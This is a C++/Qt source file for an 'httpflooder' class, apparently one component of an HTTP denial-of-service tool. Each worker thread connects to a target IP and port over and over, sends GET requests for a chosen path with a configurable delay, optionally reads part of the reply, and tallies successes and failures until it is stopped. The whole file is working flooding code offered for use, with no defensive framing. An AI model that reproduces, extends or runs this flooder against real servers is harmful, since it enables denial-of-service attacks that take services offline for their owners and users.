#include "httpflooder.h"


httpflooder::httpflooder(QString ip, quint32 port, QString protocol, quint32 delay, quint32 timeout, bool resp, QString subsite)
{
	active = true;
	IP = ip;
	Port = port;
	Protocol = protocol;
	Delay = delay;
	Timeout = timeout;
	Response = resp;
	Subsite = subsite;
	FloodCount = 0;
	Requested = 0;
	Downloaded = 0;
	Failed = 0;
	Status = idle;
}

//
// Start the HTTP request generator
//
void httpflooder::run()
{
	while (active) {

			QHostAddress *addr = new QHostAddress(IP);
			QTcpSocket *Socket = new QTcpSocket;
			Socket->connectToHost(*addr, Port);

			Status = connecting;

			if (!Socket->waitForConnected(Timeout)) {
				Socket->close();
				delete addr;
				delete Socket;
				Failed++;
				continue;
          		  }
	
			qint64 errcode = 0;
			
			Status = requesting;

			QString Data = "GET " + QUrl::toPercentEncoding(Subsite, "/+=&?$#;:,") + " HTTP/1.0\n\n\n";
   			errcode = Socket->write(Data.toUtf8(), Data.toUtf8().size());
			Socket->flush();
			if (errcode == -1) {
				Failed++;
			} else {
				Requested++;
			}

			if (Response) {

				Status = downloading;

				if (!Socket->waitForReadyRead(Timeout)) {
					Failed++;
					Socket->close();
					delete addr;
					delete Socket;
					continue;
				} else {
	
					Socket->read ( 128 );
					Downloaded++;
					this->msleep(Delay);
	
				}

			} else {

				Socket->abort();

			}
	

			Socket->close();
			delete addr;
			delete Socket;
       			Status = idle;
			this->msleep(Delay);
			
			
	}
	active = true;
}

//
// Change the thread's state to inactive
//
void httpflooder::stop()
{
	active = false;
}

   